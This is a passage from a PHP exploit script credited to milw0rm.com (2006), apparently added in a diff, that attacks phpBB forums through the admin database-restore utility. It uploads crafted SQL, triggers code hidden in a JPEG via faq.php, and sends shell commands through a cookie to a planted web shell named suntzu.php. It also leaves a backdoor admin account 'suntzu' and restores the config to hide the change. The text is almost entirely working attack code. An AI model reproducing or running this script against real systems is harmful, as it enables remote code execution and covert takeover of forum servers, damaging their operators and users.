+'.$sql.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="perform"
+
+restore
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="restore_start"
+
+Start Restore
+-----------------------------7d62702f250530--
+';
+$packet="POST ".$p."admin/admin_db_utilities.php?sid=".$session_id." HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."profile.php?mode=editprofile\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (eregi("The Database has been successfully restored",$html))
+{
+echo "Done...\r\n";
+}
+else
+{
+die("Unable to modify table...");
+}
+
+echo "step 6 -> execute code inside jpeg file\r\n";
+$packet="GET ".$p."faq.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+echo "step 7 -> Launch commands...\r\n";
+$packet="GET ".$p."suntzu.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=dir;\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("56789",$html);
+  echo "\r\n".$temp[1]."\r\n";
+}
+else
+{
+  echo "Exploit failed...however you will be able to login as admin\r\n";
+  echo "with username \"suntzu\" and password \"suntzu\"\r\n";
+}
+
+
+echo "step 8 -> restore phpbb_config with the old value to keep the board accessible\r\n";
+$sql='
+#
+# old value for default_lang
+#
+
+UPDATE phpbb_config SET config_value="english" where config_name="default_lang";
+
+';
+
+$data='-----------------------------7d62702f250530
+Content-Disposition: form-data; name="backup_file"; filename="suntzu.sql";
+Content-Type: text/plain
+
+'.$sql.'
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="perform"
+
+restore
+-----------------------------7d62702f250530
+Content-Disposition: form-data; name="restore_start"
+
+Start Restore
+-----------------------------7d62702f250530--
+';
+$packet="POST ".$p."admin/admin_db_utilities.php?sid=".$session_id." HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."profile.php?mode=editprofile\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (eregi("The Database has been successfully restored",$html))
+{
+echo "Done...\r\n";
+}
+else
+{
+die("Unable to modify table...");
+}
+?>
+
+# milw0rm.com [2006-05-13]
